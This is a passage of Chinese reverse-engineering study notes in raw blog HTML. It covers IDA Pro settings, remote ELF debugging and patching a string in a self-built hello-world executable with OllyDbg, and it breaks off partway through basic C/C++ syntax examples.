href="#菜单栏常用设置" class="headerlink" title="菜单栏常用设置"></a>菜单栏常用设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">view--&gt;open subviews: 可以恢复你无意中关闭的数据显示窗口<br>windows--&gt;reset desktop: 可以恢复初始ida布局<br>option--&gt;font: 可以改变字体的相关属性<br></code></pre></td></tr></table></figure></li><li><h4 id="在流程视图中添加地址偏移"><a href="#在流程视图中添加地址偏移" class="headerlink" title="在流程视图中添加地址偏移"></a>在流程视图中添加地址偏移</h4><p>IDA中的流程视图可以说是非常的好用，简单明了地能看出程序的执行流程，尤其是在看if分支代码和循环代码的时候，能够非常直观</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107231247345.png" alt="image-20240107231247345"></p><p>但是，我们还可以改得更加好用，在这个视图中添加地址偏移的话，我们取地址就非常方便，不再需要按空格切换视图去找，在菜单栏中设置：option–&gt;general</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107231310349.png" alt="image-20240107231310349"></p><p>将该选项打钩后就可以看到效果了：</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107231326439.png" alt="image-20240107231326439"></p></li><li><h4 id="自动添加反汇编注释"><a href="#自动添加反汇编注释" class="headerlink" title="自动添加反汇编注释"></a>自动添加反汇编注释</h4><p>这个功能对于萌新来说非常友好，在刚刚初学汇编的时候， 难免遇到几个不常用的蛇皮汇编指令，就得自己一个个去查，很麻烦，开启了自动注释的功能后，IDA就可以直接告诉你汇编指令的意思</p><p>同样是在菜单栏中设置：option–&gt;general</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107231423254.png" alt="image-20240107231423254"></p><p>效果如下：</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107231444942.png" alt="image-20240107231444942"></p></li><li><h4 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h4><p>在操作IDA的时候，经常会遇到需要创建数组的情况，尤其是为了能方便我们看字符串的时候，创建数组显得非常必要，以下我随便找了个数据来创建数组</p><p>首先点击选中你想要转换成数组的一块区域：</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107231646479-4640695.png" alt="image-20240107231646479"></p><p>接着在菜单栏中选择：edit–&gt;array，就会弹出如下的选项框</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107231903209.png" alt="image-20240107231903209"></p><p>下面来解释一下各个参数的意思：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">`Array element size` 这个值表示各数组元素的大小（这里是1个字节），是根据你选中的数据值的大小所决定的<br><br>`Maximum possible size` 这个值是由自动计算得出的，他表示数组中的元素的可能的最大值<br><br>`Array size` 表示数组元素的数量，一般都根据你选定的自动产生默认值<br><br>`Items on a line` 这个表示指定每个反汇编行显示的元素数量，它可以减少显示数组所需的空间<br><br>`Element <span class="hljs-built_in">print</span> width` 这个值用于格式化，当一行显示多个项目时，他控制列宽<br><br>`Use “dup” construct` ：使用重复结构，这个选项可以使得相同的数据值合并起来，用一个重复说明符组合成一项<br><br>`Signed elements` 表示将数据显示为有符号数还是无符号数<br><br>`Display indexes` 显示索引，使得数组索引以常规的形式显示，如果选了这个选项，还会启动右边的Indexes选项栏，用于选择索引的<br></code></pre></td></tr></table></figure><p>显示格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`Create as array` 创建为数组，这个一般默认选上的<br></code></pre></td></tr></table></figure><p>创建好了以后，就变成了这样：</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107232251268.png" alt="image-20240107232251268"></p><p>可以看到这些数据已经被当成一个数组折叠到了一起，其中<code>2 dup(0FFh)</code>这样的，表示有两个重复的数据0xff</p></li><li><h4 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h4><p>在流程视图中，分支过多的时候，可以在窗口标题处右击选择group nodes，就能把当前块折叠起来</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107232413670.png" alt="image-20240107232413670"></p><p>效果如下:</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107232432700.png" alt="image-20240107232432700"></p><p>分支块是可以自己命名的，方便自己逆向理解</p></li><li><h4 id="函数调用图"><a href="#函数调用图" class="headerlink" title="函数调用图"></a>函数调用图</h4><p>菜单栏中：view–&gt;graphs–&gt;Function calls(快捷键Ctrl+F12)</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107232527618.png" alt="image-20240107232527618"></p><p>这个图能很清楚地看到函数之间是如何相互调用的</p></li><li><h4 id="函数流程图"><a href="#函数流程图" class="headerlink" title="函数流程图"></a>函数流程图</h4><p>菜单栏中：view–&gt;graphs–&gt;flowt chart(快捷键F12)</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107232810992.png" alt="image-20240107232810992"></p><p>这个其实跟IDA自带的反汇编流程视图差不多，他可以导出来作为单独的一张图</p></li><li><h4 id="IDA动态调试elf"><a href="#IDA动态调试elf" class="headerlink" title="IDA动态调试elf"></a>IDA动态调试elf</h4><p>这里我以一个在Ubuntu虚拟机中的elf为例子，进行调试</p><p>首先把ida目录中的dbgsrv文件夹中的linux_server64拷贝到Ubuntu的elf的文件夹下，这个elf是64位的所有用的是linux_server64，如果你调试的是32位的程序，你就需要拷贝linux_server</p><p>记得给他们权限，然后在终端运行，这个程序的作用就像是连接ida和虚拟机中elf的桥梁</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107233111229.png" alt="image-20240107233111229"></p><p>然后再到ida中进行配置：</p><p>在菜单栏中选择：debugger–&gt;process options</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107233129565.png" alt="image-20240107233129565"></p><p>注意，application和input file 都是填写在虚拟机中的elf的路径，记得要加文件名</p><p>而directory 填写elf所在目录，不用加文件名</p><p>hostname是虚拟机的ip地址，port是默认的连接端口</p><p>parameter和password一般都不用填</p><p>设置好了以后点击ok</p><p>接着可以直接在反汇编视图中下断点，只要点击左边的小蓝点即可</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107233217873.png" alt="image-20240107233217873"></p><p>这时按下快捷键F9，可以直接开始调试</p><p>按下快捷键F4，则直接运行到断点处停下</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107233322340.png" alt="image-20240107233322340"></p><p>这个就是基本的各个功能区的介绍，上面是我比较喜欢的常用布局，和ida默认的不太一样，想要自定义添加一些视图的话，可以在debugger–&gt;quick debug view中添加</p><p>另外可以在Windows–&gt;save desktop来保持当前的视图布局，以后就可以直接加载使用</p><p>下面介绍一些常用的快捷键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">`F7` 单步步入，遇到函数，将进入函数代码内部<br>`F8` 单步步过，执行下一条指令，不进入函数代码内部<br>`F4` 运行到光标处（断点处）<br>`F9` 继续运行<br>`CTRL+F2` 终止一个正在运行的调试进程<br>`CTRL+F7` 运行至返回,直到遇到RETN（或断点）时才停止.<br></code></pre></td></tr></table></figure><p>知道了这些快捷键后，调试起来就比较容易了，ida调试有个比较方便的地方在于能直接看到函数的真实地址，下断点也非常直观易操作</p></li><li><h4 id="IDA导出数据文件"><a href="#IDA导出数据文件" class="headerlink" title="IDA导出数据文件"></a>IDA导出数据文件</h4><p>在菜单栏中，这里有个选项可以生成各种不同的输出文件</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107233456145.png" alt="image-20240107233456145"></p><p>这里简单的介绍前两个文件，后面的大家可以自己去生成测试一下用途，我这里就不详细介绍了</p><p>.map文件描述二进制文件的总体结构，包括与构成改二进制文件的节有关的信息，以及每个节中符号的位置。</p><p>.asm文件，也就是汇编了，直接能导出ida中反汇编的结果，这个非常实用，有的时候在逆向中经常遇到大量数据加解密的情况，如果在从IDA中一个个慢慢复制可就太没效率了，直接导出生成asm，在里面复制数据快很多</p></li></ul><h2 id="四：修改字符串"><a href="#四：修改字符串" class="headerlink" title="四：修改字符串"></a>四：修改字符串</h2><ul><li><p><strong>直接修改字符串缓冲区</strong><br>在dump窗口按ctrl+G快捷键执行Go to命令，在弹出的窗口中输入字符串的地址进入字符串缓冲区。然后在选中地址处的字符串，按ctrl+e快捷键打开编辑窗口修改<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164604125.png" alt="image-20240107164604125">unicode字符串必须以null结束，它占据2个字节(添加null时不能直接在unicode文本框中进行，需要在hex项目中添加)<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164614032.png" alt="image-20240107164614032">上面的更改只是零时的，永久保存就要更改程序后另保存为一个可执行文件。<br>在dump窗口中，选中更改后的字符串—单击鼠标右键—在弹出的菜单中选中copy to executable file菜单<br>然后 在hex窗口中鼠标右键–选择save file菜单</p></li><li><p><strong>在其他内存区域生成新字符串并传递给消息函数</strong><br>按ctrl+f2重新调试，开始的时候在main函数的地址处下了断点在按f9就会自动跳转到main函数处了</p></li></ul><p>向MessageBoxW()函数传递字符串参数时，传递的是字符串所在区域的首地址。如果改变了字符串地址，消息框就会显示改变后的字符串。在内存的某个区域新建一个长字符串，并把新字符串的首地址传递给MessageBoxW()函数，可以人为传递的是完全不同的字符串地址。</p><ul><li><strong>简单分析helloword</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR * argv[])<br>&#123;<br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>,<span class="hljs-string">&quot;Hello World!&quot;</span>,<span class="hljs-string">&quot;张轩瑞&quot;</span>,MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用vs生成release exe<br>用od打开<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165444269.png" alt="image-20240107165444269">打开后直接敲messageboxw(因为输出字符会调用这个api)<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165453431.png" alt="image-20240107165453431">然后我们直接点击即可,来到了这里<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165504057.png" alt="image-20240107165504057"><br>在函数起始地址处下上断点(f2)<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165528264.png" alt="image-20240107165528264">然后按f9继续执行<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165541449.png" alt="image-20240107165541449">程序执行到messageboxw代码的断点处就停下来了，可以看见栈中的值<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165550187.png" alt="image-20240107165550187">esp值的18ff30处对应一个返回地址401014，helloworld.exe的main()函数调用完messageboxw函数后，程序执行流将返回到该地址处。按ctrl+f9快捷键使程序运行到messageboxw函数的RETN命令处，然后按F7键也可以返回到401014地址处。地址401014的上方就是地址40100E,它正是调用messageboxw函数的地方<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165600196.png" alt="image-20240107165600196"><strong>修改字符串缓冲：</strong><br>在dump窗口输入ctrl+g快捷键执行go to命令<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165611354.png" alt="image-20240107165611354">然后点击确定，然后选中4092A0地址处的字符串<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165620415.png" alt="image-20240107165620415">快捷键ctrl+e打开编辑窗口<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165627904.png" alt="image-20240107165627904">请注意：unicode字符串必须以null结束，它占据2个字节(添加null时不能直接在unicode文本框中进行，而要在hex项目中添加)<br>然后鼠标右键–&gt;复制到可执行文件—&gt;保存为文件 保存为exe即可<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165644182.png" alt="image-20240107165644182"><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165654132.png" alt="image-20240107165654132">运行修改生成后的exe，可见修改成功<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165703021.png" alt="image-20240107165703021"></p><p><strong>其他内区域新建字符串并传递给消息函数</strong><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165713633.png" alt="image-20240107165713633">401007地址处有一条push 004029A0命令（前面那字符串不用管），它是把该地址处的值也就是hello world传递给messageboxw()函数   (字符串所在区域首地址)</p><p>我们在方法一中修改的字符串地址为4092A0,在dump窗口查看该部分<br>，我们找到内存区域有null填充的部分<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165724511.png" alt="image-20240107165724511">在这里远一个地址填入我们想要修改的字符串<br>修改地址<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165813929.png" alt="image-20240107165813929">按f9运行程序<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107165824384.png" alt="image-20240107165824384">修改成功</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向学习笔记 一</title>
    <link href="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <url>/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="C语言概述"><a href="#C语言概述" class="headerlink" title="C语言概述"></a>C语言概述</h2><ul><li><strong>基础语法</strong><br>指针</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> *b)</span> &#123;<br><span class="hljs-type">int</span> temp = *a + *b;<br>*a = temp;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">int</span> x = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> y = <span class="hljs-number">20</span>;<br>add(&amp;x,&amp;y);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, x);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//结果30</span><br></code></pre></td></tr></table></figure><p>fgets&#x2F;fputs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> sz[<span class="hljs-number">50</span>];<br>fgets(sz,<span class="hljs-number">50</span>,<span class="hljs-built_in">stdin</span>);<br><span class="hljs-built_in">fputs</span>(sz,<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>C预处理器</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-comment">//定义预处理器</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUM(a, b, c) a+b+c</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> c = NUM(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,c);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="c-基础"><a href="#c-基础" class="headerlink" title="c++基础"></a>c++基础</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-comment">//赋值新特性也可以用=</span><br><span class="hljs-type">int</span> num&#123; <span class="hljs-number">5</span> &#125;;<br>std::cout &lt;&lt; num &lt;&lt; std::endl;<br><span class="hljs-comment">//声明为常量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> num1=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-comment">//起别名</span><br><span class="hljs-comment">//typedef unsigned int uint32;</span><br><span class="hljs-keyword">using</span> uint32 = <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>uint32 num&#123; <span class="hljs-number">9</span> &#125;;<br>num = num &lt;&lt; <span class="hljs-number">3</span>;<br>std::cout &lt;&lt; num &lt;&lt; std::endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>决策</strong><br>if-else  switch</p></li><li><p><strong>循环</strong><br>for while  do-while</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>std::vector&lt;<span class="hljs-type">int</span>&gt;nNum;<br><span class="hljs-comment">//往里添加元素</span><br>nNum.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">10</span>);<br><span class="hljs-comment">//删除元素  pop_back()</span><br><span class="hljs-comment">//清空元素</span><br>nNum.<span class="hljs-built_in">clear</span>();<br><span class="hljs-comment">//初始化 std::vector&lt;int&gt;nNum(10,20);</span><br><span class="hljs-comment">//初始化 std::vector&lt;int&gt;nNum&#123;1,2,3,4,5,6,7&#125;;</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>命名空间</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 